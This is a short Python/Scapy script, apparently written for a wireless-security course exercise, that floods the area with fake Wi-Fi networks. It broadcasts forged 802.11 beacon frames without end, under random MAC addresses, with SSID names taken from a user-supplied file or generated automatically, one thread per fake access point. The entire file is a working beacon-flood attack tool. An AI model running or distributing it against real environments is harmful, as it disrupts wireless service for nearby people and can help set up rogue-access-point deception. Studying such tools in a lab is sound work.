#!/usr/bin/env python3

"""
Author: Rébecca Tevaearai, 

Created: 26th March, 2022

Développer un script en Python/Scapy capable d'inonder la
salle avec des SSID dont le nom correspond à une liste
contenue dans un fichier text fournit par un utilisateur.
Si l'utilisateur ne possède pas une liste, il peut
spécifier le nombre d'AP à générer. Dans ce cas, les SSID
seront générés de manière aléatoire.

"""

from scapy.all import *
from argparse import ArgumentParser as AP
from threading import Thread

def send_beacon(SSID, MAC, interface, infinite=True):
    dot11 = Dot11(type = 0, subtype = 8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = MAC, addr3 = MAC)
    beacon = Dot11Beacon(cap = 'ESS+privacy')
    essid = Dot11Elt(ID = 'SSID', info = SSID, len = len(SSID))
    packet = RadioTap()/dot11/beacon/essid
    sendp(packet, inter = 0.1, iface = interface, loop = 1, verbose = 0)    

if __name__ == '__main__':
    parser = AP(description = "SSID flood script")
    parser.add_argument("-i", "--interface", required = True, help = "the interface name")
    parser.add_argument("-l", "--list", required = False, help = "list of false SSID")
    args = parser.parse_args()

    if not args.list:
        nb_ap = int(input("Enter the number of fake AP you want: "))
        for i in range(nb_ap):
            mac = RandMAC()
            Thread(target = send_beacon, args = ("fake-wifi-" + str(i), mac, args.interface)).start()
    else:
        f = open(args.list, "r")
        lines = f.readlines()
        for line in lines:
            mac = RandMAC()
            Thread(target = send_beacon, args = (line, mac, args.interface)).start()

        